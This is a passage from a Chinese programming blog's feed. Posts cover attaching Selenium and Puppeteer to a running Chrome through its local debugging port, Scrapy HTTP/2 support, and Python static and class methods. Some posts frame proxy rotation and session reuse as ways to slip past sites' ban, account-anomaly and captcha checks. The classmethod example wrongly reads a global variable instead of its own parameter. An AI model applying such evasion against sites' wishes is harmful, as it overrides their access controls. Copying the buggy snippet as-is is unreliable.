      &lt;p&gt;我们知道，在写爬虫的过程中，如果总是使用同一个 IP，很容易就会被网站识别并封禁，所以需要使用代理 IP 并经常更换。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Puppeteer" scheme="https://www.kingname.info/tags/Puppeteer/"/>
    
      <category term="代理" scheme="https://www.kingname.info/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Selenium如何接管已经运行的Chrome浏览器？</title>
    <link href="https://www.kingname.info/2021/12/23/remote-debug-selenium/"/>
    <id>https://www.kingname.info/2021/12/23/remote-debug-selenium/</id>
    <published>2021-12-23T02:55:10.000Z</published>
    <updated>2021-12-23T02:57:30.636Z</updated>
    
    <content type="html"><![CDATA[<p>在昨天的文章<a href="https://mp.weixin.qq.com/s/ZifW2YtB_G2hmf_Es0BAgw" target="_blank" rel="noopener">一日一技：爬虫模拟浏览器如何避免重复登录？</a>中，我讲到了如何使用Puppeteer接管已经运行的Chrome。今天我们来讲讲使用Selenium如何实现这个功能。</p><a id="more"></a><p>在正式开始之前，先纠正昨天的一个错误。昨天我讲到，Windows电脑启动Chrome的远程调试模式用到的命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件路径/chrome.exe --remote-debugging-port=9222</span><br></pre></td></tr></table></figure><p>这个地方漏掉了一个参数。正确的命令应该是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件路径/chrome.exe --remote-debugging-port=9222 --user-data-dir=<span class="string">"某个存在的文件夹地址"</span></span><br></pre></td></tr></table></figure><p>好了，回到正题。现在无论你使用macOS还是Windows，首先按昨天的文章所说，启动Chrome开放9222端口。然后，在这个Chrome中，手动登录示例网站。</p><p>接下来，编写下面这段代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> Chrome</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_experimental_option(<span class="string">"debuggerAddress"</span>, <span class="string">"127.0.0.1:9222"</span>)</span><br><span class="line"><span class="comment"># 注意我把chromedriver文件放到了当前文件夹里面，所以可以这样调用</span></span><br><span class="line"><span class="comment"># 如果你是windows电脑，你需要使用./chromedriver.exe</span></span><br><span class="line">driver = Chrome(<span class="string">'./chromedriver'</span>, options=chrome_options)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">driver.get(<span class="string">'http://exercise.kingname.info/exercise_login_success'</span>)</span><br><span class="line">input(<span class="string">'输入任意内容继续'</span>)</span><br><span class="line">driver.get(<span class="string">'https://www.kingname.info'</span>)</span><br><span class="line">input(<span class="string">'输入任意内容继续'</span>)</span><br><span class="line">driver.get(<span class="string">'http://exercise.kingname.info/exercise_login_success'</span>)</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211216183133.png" alt></p><p>由于使用Selenium的时候，始终操作的都是当前标签页，为了证明确实有效，所以我在示例代码里面，先把爬虫暂停，需要你在终端按下任何键以后，再打开我的博客。接下来，等你确认博客已经打开以后，再回到终端按下任意键，Chrome会再次打开登录成功的页面。</p><p>你还可以试一试把Python程序终止，再重新运行。你会发现代码依然可以接管这个浏览器窗口。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在昨天的文章&lt;a href=&quot;https://mp.weixin.qq.com/s/ZifW2YtB_G2hmf_Es0BAgw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：爬虫模拟浏览器如何避免重复登录？&lt;/a&gt;中，我讲到了如何使用Puppeteer接管已经运行的Chrome。今天我们来讲讲使用Selenium如何实现这个功能。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Selenium" scheme="https://www.kingname.info/tags/Selenium/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：爬虫模拟浏览器如何避免重复登录？</title>
    <link href="https://www.kingname.info/2021/12/23/remote-debug-puppeteer/"/>
    <id>https://www.kingname.info/2021/12/23/remote-debug-puppeteer/</id>
    <published>2021-12-23T02:55:02.000Z</published>
    <updated>2021-12-23T02:56:51.573Z</updated>
    
    <content type="html"><![CDATA[<p>当我们使用模拟浏览器访问一个网站的时候，可能会遇到网站需要登录的情况。我的爬虫练习网站提供了这样一个<a href="http://exercise.kingname.info/exercise_login_success" target="_blank" rel="noopener">登录练习</a>的案例。</p><p>如果你手动用浏览器测试，你会发现这样一个现象：第一次访问的时候，自动跳转到登录页面。输入账号<code>kingname</code>和密码<code>genius</code>以后，可以看到登录成功的页面，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215170103.png" alt></p><p>现在，你把浏览器关了再打开，然后再次访问这个网址，你会发现浏览器直接就能进入到登录成功的页面，不会再出现登录页面。</p><a id="more"></a><p>我们都知道，这是因为浏览器记住了网站的Cookies，即使关闭了浏览器再打开，这个Cookies依然存在，所以可以绕过登录功能。</p><p>但如果你使用Selenium或者Puppeteer/Pyppeteer，那么情况就不是这样了。当你第一次登录成功了以后，退出程序。第二次重新运行程序的时候，爬虫又要重新登录一次。这个过程一来拖慢了爬虫的运行速度，二来容易让网站检测到你的账号异常——难道自动登录功能失效了？为什么其他人的都正常，他的账号每小时都要重新登录一次？可能是爬虫，发个验证码过去探探虚实。</p><p>同理，还有时候，网站登录会出现很麻烦的验证码，但是一旦登录成功，这个验证码就再也不会出现了。处理这种验证码最简单的办法就是直接人工参与。那么如果爬虫每小时都要运行一次，岂不是每小时都要人来过一次验证码？能不能让爬虫只登录一次，之后就再也不登陆了呢？</p><p>方法有两个。第一个方法，也是大家最直观能想到的方法：登陆成功以后，把Cookies保存下来。下一次要重新登陆的时候直接把这个Cookies设置到浏览器里面可以了。这个方法网上有很多例子，你可以通过关键词“selenium 获取cookies”和“selenium设置cookies”搜索到，我就不再赘述了。</p><p>我们今天要讲的是第二个方法，也是最简单的方法。并且这个方法听起来很弱智：我不关浏览器，它的Cookies不就不会清空了吗？</p><p>但你仔细想一下，根据你之前的经验，当你的爬虫代码退出的时候，是不是浏览器也被自动关闭了？即使因为某种原因，爬虫代码本身崩溃了，浏览器没有关闭，那你第二次启动爬虫的时候，怎么重新连回之前启动的浏览器？</p><p>我们今天要做的，就是把启动浏览器和启动爬虫，这两件事情分开。首先使用某种方法单独启动浏览器，然后再启动爬虫代码，并且让爬虫代码接管这个浏览器并控制它。</p><p>Chrome浏览器是支持远程调试模式的。这个模式打开的情况下，Puppeteer或者Selenium可以通过websocket连上去，进而控制它。</p><p>首先我们来启动Chrome的远程调试端口。你需要找到Chrome的安装位置，在Chrome的地址栏输入<code>chrome://version</code>就能找到Chrome的安装路径，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215204518.png" alt></p><p>有了这个以后，我们需要执行命令启动支持远程调试功能的Chrome。如果你的电脑是Mac，那么命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"</span>  --remote-debugging-port=9222 --no-first-run --no-default-browser-check --user-data-dir=$(mktemp -d -t <span class="string">'chrome-remote_data_dir'</span>)</span><br></pre></td></tr></table></figure><p>注意，由于地址中有空格，所以要把可执行文件的路径用引号抱起来。</p><p>如果你的电脑是Windows，那么就很简单了，执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件路径/chrome.exe --remote-debugging-port=9222</span><br></pre></td></tr></table></figure><p>启动以后如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215204912.png" alt></p><p>此时，你先不要动这个通过命令启动的Chrome。你先打开普通的浏览器，输入网址：<code>http://127.0.0.1:9222/json/version</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215205821.png" alt></p><p>记住其中的<code>webSocketDebuggerUrl</code>后面的地址。这就是我们远程链接的地址。</p><p>今天我们以Puppeteer为例，介绍如何连接这个远程的Chrome。</p><p>在连之前，我们首先做一件事情，在通过命令启动的这个Chrome中，打开我们的登录练习页面，然后手动登录它。如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215205305.png" alt></p><p>然后，我们来写一段Puppeteer的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> address = <span class="string">'ws://127.0.0.1:9222/devtools/browser/f6ede2a1-cf7b-4a0d-b0ea-9c0cd24d240d'</span></span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.connect(&#123;</span><br><span class="line">  browserWSEndpoint: address,</span><br><span class="line">&#125;);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">response = <span class="keyword">await</span> page.goto(<span class="string">'http://exercise.kingname.info/exercise_login_success'</span>, &#123; <span class="attr">waitUntil</span>: <span class="string">'load'</span>, <span class="attr">timeout</span>: <span class="number">0</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line">run()</span><br></pre></td></tr></table></figure><p>这段代码最核心的就两行，连接远程的Chrome：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> address = <span class="string">'ws://127.0.0.1:9222/devtools/browser/f6ede2a1-cf7b-4a0d-b0ea-9c0cd24d240d'</span></span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.connect(&#123;</span><br><span class="line">  browserWSEndpoint: address,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215210106.png" alt></p><p>可以看到，代码控制浏览器打开了一个新的标签页，并且立刻就能打开登录成功后的页面，不需要再次登录。</p><p>大家可以试一试，现在在终端窗口里面按下Ctrl + C把当前的爬虫代码强行关闭，然后再启动一次，你会发现依然是登录以后的页面。</p><p>这样一来，以后遇到需要登录的网站，只需要使用这个远程调试模式，先启动一个支持远程调试的Chrome浏览器，然后手动在浏览器上完成登录操作，接下来爬虫代码就再也不需要考虑登录这个动作了，爬虫可以直接访问登录后的页面。</p><p>你自己测试的过程中，可能会发现标签页越开越多。其实不用担心，这是因为我为了演示登录后的页面，没有关闭当前标签页导致的。你的爬虫执行完操作以后，可以使用<code>await page.close()</code>关闭当前标签页。只要至少保留一个标签页不关闭，那么这个浏览器窗口就可以一直使用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当我们使用模拟浏览器访问一个网站的时候，可能会遇到网站需要登录的情况。我的爬虫练习网站提供了这样一个&lt;a href=&quot;http://exercise.kingname.info/exercise_login_success&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;登录练习&lt;/a&gt;的案例。&lt;/p&gt;
&lt;p&gt;如果你手动用浏览器测试，你会发现这样一个现象：第一次访问的时候，自动跳转到登录页面。输入账号&lt;code&gt;kingname&lt;/code&gt;和密码&lt;code&gt;genius&lt;/code&gt;以后，可以看到登录成功的页面，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211215170103.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;现在，你把浏览器关了再打开，然后再次访问这个网址，你会发现浏览器直接就能进入到登录成功的页面，不会再出现登录页面。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Puppeteer" scheme="https://www.kingname.info/tags/Puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：谁说 Scrapy 不能爬 HTTP/2?</title>
    <link href="https://www.kingname.info/2021/10/21/scrapy-http2/"/>
    <id>https://www.kingname.info/2021/10/21/scrapy-http2/</id>
    <published>2021-10-21T13:27:02.000Z</published>
    <updated>2021-10-21T13:28:38.070Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-15-04-09.png" alt></p><p>之前有一位爬虫大佬写了一篇文章，说 HTTP/2协议天然就能防大部分的爬虫。Python 无论是 requests 还是 Scrapy 都不支持 HTTP/2协议。</p><p><a href="https://http2.golang.org/" target="_blank" rel="noopener">Go + HTTP/2</a>这个网站可以检测你是否使用 HTTP/2协议进行请求。当我们直接使用浏览器访问的时候，页面长这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-51-13.png" alt="注意红框中的文字"></p><p>但如果我们直接使用 Scrapy 访问这个页面，并打印源代码，返回的 HTML 长这样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-52-26.png" alt="注意红框中的文字"></p><p>这样看起来，似乎Scrapy 确实不支持HTTP/2协议？</p><a id="more"></a><p>但我为什么总是一直强调要读官方文档，不要去搜索一些垃圾博客呢。因为官方文档里面，已经明确告诉你Scrapy 不仅原生支持 HTTP/2，而且只需要改一个配置就可以了：<a href="https://docs.scrapy.org/en/latest/topics/settings.html#download-handlers-base" target="_blank" rel="noopener">Settings — Scrapy 2.5.0 documentation</a>。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-55-17.png" alt="更换下载器句柄就可以了"></p><p>请大家注意上图中标红色方框的地方。根据它的描述，我只需要在<code>settings.py</code>文件中，更新下载器句柄（handlers）就可以了。我们来测试一下。把下面这段代码直接复制到 Scrapy 爬虫中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD_HANDLERS = &#123;</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">'scrapy.core.downloader.handlers.http2.H2DownloadHandler'</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-57-55.png" alt></p><p>改好以后，重新运行爬虫，打印出来的源代码如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-59-26.png" alt></p><p>可以看到，不需要安装任何额外的库。Scrapy 原生就支持 HTTP/2了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-15-04-09.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;之前有一位爬虫大佬写了一篇文章，说 HTTP/2协议天然就能防大部分的爬虫。Python 无论是 requests 还是 Scrapy 都不支持 HTTP/2协议。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://http2.golang.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Go + HTTP/2&lt;/a&gt;这个网站可以检测你是否使用 HTTP/2协议进行请求。当我们直接使用浏览器访问的时候，页面长这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-51-13.png&quot; alt=&quot;注意红框中的文字&quot;&gt;&lt;/p&gt;
&lt;p&gt;但如果我们直接使用 Scrapy 访问这个页面，并打印源代码，返回的 HTML 长这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-10-02-14-52-26.png&quot; alt=&quot;注意红框中的文字&quot;&gt;&lt;/p&gt;
&lt;p&gt;这样看起来，似乎Scrapy 确实不支持HTTP/2协议？&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="Scrapy" scheme="https://www.kingname.info/tags/Scrapy/"/>
    
      <category term="HTTP/2" scheme="https://www.kingname.info/tags/HTTP-2/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：什么情况使用静态方法和类方法？</title>
    <link href="https://www.kingname.info/2021/10/08/staticmethod-and-classmethod/"/>
    <id>https://www.kingname.info/2021/10/08/staticmethod-and-classmethod/</id>
    <published>2021-10-08T15:08:57.000Z</published>
    <updated>2021-10-08T15:10:12.767Z</updated>
    
    <content type="html"><![CDATA[<p>有同学在知识星球上问我，什么情况下使用静态方法，什么情况下使用类方法。今天我们就来捋一下这两个方法的应用场景。</p><a id="more"></a><p>首先，我们来定义一个普通的类。里面都是普通的方法。普通的方法又叫做实例方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(self, a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = self.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br></pre></td></tr></table></figure><p>这个类运行起来的效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008184034.png" alt></p><p>大家注意在个类里面的方法<code>add_two_string_num</code>，它接受两个参数，把他们转换为<code>int</code>类型，然后相加并返回结果。这个过程非常简单。但是，它跟People这个类有什么直接关系吗？</p><p>其实这个方法跟这个类没有什么直接关系，我们甚至把它改成函数都可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    a_int = int(a)</span><br><span class="line">    b_int = int(b)</span><br><span class="line">    <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">kingname = People(<span class="string">'kingname'</span>, <span class="number">20</span>)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>运行结果跟之前完全一样：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008184448.png" alt></p><p>我们可以说，<code>add_two_string_num</code>函数就是一个<code>工具函数</code>。工具函数接收参数，输出结果。完全不关心谁在调用他，也不关心在哪里调用他。</p><p>但现在有一个比较尴尬的事情，这个函数，只有 <code>People</code>在调用，其它地方都没有调用。单独把它放到其它地方又显得多余，弄成实例方法又浪费了self参数，这个时候，我们就可以用静态方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = People.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kingname = People(<span class="string">'kingname'</span>, <span class="number">20</span>)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><blockquote><p>一句话总结：静态方法就是某个类专用的工具函数。</p></blockquote><p>说完了静态方法，我们再说说类方法。什么情况下应该使用类方法呢？回答这个问题前，我先返回你一个问题，怎么把<code>People</code>类初始化成一个实例？</p><p>你说这还不简单吗，一行代码就行了啊：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx = People(<span class="string">'xxx'</span>, <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>注意，这里你在初始化这个类的时候，你是一个一个参数传入进去的。如果你用过顺丰寄送快递，你就会发现，填写收件人的时候，有两种方式，一种方式就像上线这样，一个一个参数填进去。还有一种方式，它给你一个输入框，你把一段包含姓名，地址，手机号的文字粘贴进去，它自动解析。</p><p>那么，如果我现在给你一个字符串：<code>我的名字：青南，我的年龄：20，把它提取出来</code>。你怎么基于这个字符串生成People类的实例？</p><p>这个时候，你可能会这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">content = <span class="string">'我的名字：青南，我的年龄：20，把它提取出来'</span></span><br><span class="line">name = re.search(<span class="string">'名字：(.*?)，'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">age = re.search(<span class="string">'年龄：(\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">kingname = People(name, age)</span><br></pre></td></tr></table></figure><p>这样做确实可以，但我能不能让People这个类自动识别呢？其实是可以的，有两种方法，一种方法是在<code>__init__</code>里面多加几个参数，然后在初始化的时候，从这几个参数里面解析，这个方法大家都知道，我就不多讲了。我们来讲讲第二个方法，就是使用类方法。</p><p>我们只需要在定义一个类方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">introduce_myself</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">f'大家好，我叫: <span class="subst">&#123;self.name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_two_string_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">        a_int = int(a)</span><br><span class="line">        b_int = int(b)</span><br><span class="line">        <span class="keyword">return</span> a_int + b_int</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_chinese_string</span><span class="params">(cls, sentence)</span>:</span></span><br><span class="line">        name = re.search(<span class="string">'名字：(.*?)，'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        age = re.search(<span class="string">'年龄：(\d+)'</span>, content).group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> cls(name, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calc_age_after_n_year</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        age = People.add_two_string_num(self.age, n)</span><br><span class="line">        print(<span class="string">f'<span class="subst">&#123;n&#125;</span>年以后，我<span class="subst">&#123;age&#125;</span>岁'</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">content = <span class="string">'我的名字：青南，我的年龄：20，把它提取出来'</span></span><br><span class="line">kingname = People.from_chinese_string(content)</span><br><span class="line">kingname.introduce_myself()</span><br><span class="line">kingname.calc_age_after_n_year(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20211008190533.png" 